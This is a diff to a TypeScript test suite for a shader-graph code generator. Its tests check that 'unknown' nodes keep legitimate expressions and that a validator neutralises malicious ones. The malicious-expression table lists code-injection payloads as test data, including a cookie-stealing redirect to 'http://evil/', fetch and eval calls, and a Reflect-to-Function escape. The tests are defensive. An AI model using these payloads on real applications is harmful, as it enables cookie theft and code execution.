@@ -566,26 +566,45 @@ describe('graphToCode — noise nodes', () => {
 describe('graphToCode — unknown nodes', () => {
   it('round-trips the preserved raw expression verbatim', () => {
     const u = makeNode('u', 'unknown', {
-      functionName: 'mysteryFn',
-      rawExpression: 'mysteryFn(1, 2, 3)',
+      functionName: 'saturate',
+      rawExpression: 'saturate(1, 2, 3)',
     });
     const out = makeNode('out', 'output');
     const { code } = graphToCode([u, out], [makeEdge('u', 'out', 'out', 'color')]);
-    expect(code).toContain('const mysteryFn1 = mysteryFn(1, 2, 3);');
+    expect(code).toContain('const saturate1 = saturate(1, 2, 3);');
   });
 
   // Legitimate TSL shapes that codeToGraph can legitimately capture must still
   // survive the validator, including nested calls, swizzles, and arithmetic.
   it.each([
-    'mysteryFn(vec3(1, 2, 3), 0.5)',
-    'mysteryFn(positionLocal.mul(2.0))',
-    'mysteryFn(uv().x, -1.0)',
-    'mysteryFn(a, b, c)',
+    'saturate(vec3(1, 2, 3), 0.5)',
+    'saturate(positionLocal.mul(2.0))',
+    'saturate(uv().x, -1.0)',
+    'saturate(time, positionLocal.xyz, 2)',
   ])('preserves a legitimate expression: %s', (rawExpression) => {
-    const u = makeNode('u', 'unknown', { functionName: 'mysteryFn', rawExpression });
+    const u = makeNode('u', 'unknown', { functionName: 'saturate', rawExpression });
     const out = makeNode('out', 'output');
     const { code } = graphToCode([u, out], [makeEdge('u', 'out', 'out', 'color')]);
-    expect(code).toContain(`const mysteryFn1 = ${rawExpression};`);
+    expect(code).toContain(`const saturate1 = ${rawExpression};`);
+  });
+
+  // The names an unknown READS are an allow-list (unknownExpression.ts, rule
+  // 5): the module's own declarations qualify, a name declared nowhere — a
+  // stale or hidden one, or a global — does not, and neither does a call to
+  // anything but TSL or a module helper.
+  it('reads a name the module declares; one it does not is read as 0, token by token', () => {
+    const f = makeNode('f', 'float', { value: 2 });
+    const reads = (expr: string) => graphToCode(
+      [f, makeNode('u', 'unknown', { functionName: 'saturate', rawExpression: expr }), makeNode('out', 'output')],
+      [makeEdge('f', 'out', 'out', 'roughness'), makeEdge('u', 'out', 'out', 'color')],
+    ).code;
+    expect(reads('saturate(float1)')).toContain('const saturate1 = saturate(float1);');
+    // A dangling name (a stale one, a one-way node's) and a global alike.
+    expect(reads('saturate(float2, float1)')).toContain('const saturate1 = saturate(float(0), float1);');
+    expect(reads('saturate(opener.x)')).toContain('const saturate1 = saturate(float(0).x);');
+    // A gateway, or a call to anything but TSL, is still the whole fallback.
+    expect(reads('saturate(top)')).toContain('const saturate1 = float(0);');
+    expect(reads('mysteryFn(float1)')).toContain('const saturate1 = float(0);');
   });
 
   // A tampered .fastshader/.js could swap rawExpression for code that executes
@@ -593,23 +612,27 @@ describe('graphToCode — unknown nodes', () => {
   // pure data/TSL expression with the inert `float(0)` fallback. (Defense in
   // depth — the preview iframe is also sandboxed to an opaque origin.)
   it.each([
-    ['IIFE arrow argument', 'mysteryFn((() => { window.location = "http://evil/" + document.cookie })())'],
-    ['fetch in argument', 'mysteryFn(fetch("http://evil"))'],
+    ['IIFE arrow argument', 'saturate((() => { window.location = "http://evil/" + document.cookie })())'],
+    ['fetch in argument', 'saturate(fetch("http://evil"))'],
     ['bare eval call', 'eval("alert(1)")'],
-    ['forbidden global in argument', 'mysteryFn(window.document.cookie)'],
+    ['forbidden global in argument', 'saturate(window.document.cookie)'],
     ['member-expression callee', 'window.fetch("http://evil")'],
-    ['statement list', 'mysteryFn(); fetch("http://evil")'],
-    ['assignment in argument', 'mysteryFn(window.name = "x")'],
-    ['computed property access', 'mysteryFn(self["eval"]("x"))'],
+    ['statement list', 'saturate(); fetch("http://evil")'],
+    ['assignment in argument', 'saturate(window.name = "x")'],
+    ['computed property access', 'saturate(self["eval"]("x"))'],
+    ['Reflect reaching Function', "saturate(Reflect.apply(Reflect.apply(Reflect.get(float, 'constructor'), null, ['globalThis.__pwned = 1']), null, []))"],
+    ['TS type arguments', 'saturate<import("data:text/javascript,globalThis.__pwned=1")>(1)'],
   ])('neutralizes a malicious expression (%s) to float(0)', (_label, rawExpression) => {
-    const u = makeNode('u', 'unknown', { functionName: 'mysteryFn', rawExpression });
+    const u = makeNode('u', 'unknown', { functionName: 'saturate', rawExpression });
     const out = makeNode('out', 'output');
     const { code } = graphToCode([u, out], [makeEdge('u', 'out', 'out', 'color')]);
-    expect(code).toContain('const mysteryFn1 = float(0);');
+    expect(code).toContain('const saturate1 = float(0);');
     expect(code).not.toContain('fetch');
     expect(code).not.toContain('window');
     expect(code).not.toContain('eval');
     expect(code).not.toContain('document');
+    expect(code).not.toContain('Reflect');
+    expect(code).not.toContain('import(');
   });
 });
 
